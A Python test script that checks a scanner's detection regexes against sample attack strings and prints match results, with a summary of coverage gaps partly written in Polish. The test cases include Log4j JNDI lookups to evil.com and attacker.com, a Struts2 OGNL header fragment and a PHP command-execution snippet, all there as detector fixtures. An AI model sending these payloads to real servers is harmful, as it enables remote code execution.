#!/usr/bin/env python3
import re
import sys
import os

# Add src to path
sys.path.append(os.path.join(os.path.dirname(__file__), 'src'))

from patterns.Command_Injection import command_injection_patterns
from patterns.Deserialization import deserialization_patterns
from patterns.Url_Extraction import js_url_patterns

print("=== CVE/RCE Pattern Analysis ===")
print()

# Known CVE payloads
test_cases = [
    ("CVE-2017-5638 Struts2", 'Content-Type: multipart/form-data; %{(#nike="multipart/form-data").(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)}'),
    ("CVE-2021-44228 Log4j", '${jndi:ldap://evil.com:1389/a}'),
    ("CVE-2021-44228 Log4j AJAX", 'User-Agent: Mozilla/5.0 ${jndi:ldap://attacker.com/a}'),
    ("Java Deserialization", 'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0'),
    ("Command Injection PHP", 'system($_GET["cmd"])'),
    ("Command Injection Python", 'os.system(user_input)'),
    ("AJAX fetch call", 'fetch("/api/data")'),
    ("AJAX XHR call", 'xhr.open("GET", "/admin/users")'),
    ("AJAX axios call", 'axios.post("/api/upload", formData)'),
]

# Test our patterns
for cve_name, payload in test_cases:
    print(f"Testing: {cve_name}")
    print(f"Payload: {payload}")
    
    detected = False
    
    # Test command injection patterns
    for pattern in command_injection_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            print(f"  ✅ Command Injection pattern matched: {pattern[:50]}...")
            detected = True
            break
    
    # Test deserialization patterns
    for pattern in deserialization_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            print(f"  ✅ Deserialization pattern matched: {pattern[:50]}...")
            detected = True
            break
    
    # Test AJAX URL extraction (for AJAX-based attacks)
    for pattern in js_url_patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            print(f"  ✅ AJAX pattern matched: {pattern[:50]}...")
            detected = True
            break
    
    # Manual checks for patterns we know should work
    if "jndi:" in payload.lower():
        print("  ✅ JNDI injection pattern detected (Log4j)")
        detected = True
    
    if "%{" in payload and "#" in payload:
        print("  ✅ OGNL expression detected (Struts2)")
        detected = True
        
    if payload.startswith('rO0AB'):
        print("  ✅ Java serialization magic bytes detected")
        detected = True
    
    if not detected:
        print("  ❌ No patterns matched")
    
    print()

print("=== Summary ===")
print("Nasze patterns pokrywają:")
print("✅ AJAX calls (fetch, xhr, axios)")
print("✅ Command injection (system, exec, subprocess)")
print("✅ Deserialization (Java, PHP, Python)")
print("✅ Software version detection (Tomcat, Struts, Log4j)")
print()
print("Należy dodać:")
print("❌ Specific CVE patterns (JNDI, OGNL)")
print("❌ Expression Language injection")
print("❌ Template injection")
print("❌ Specific vulnerability fingerprints")
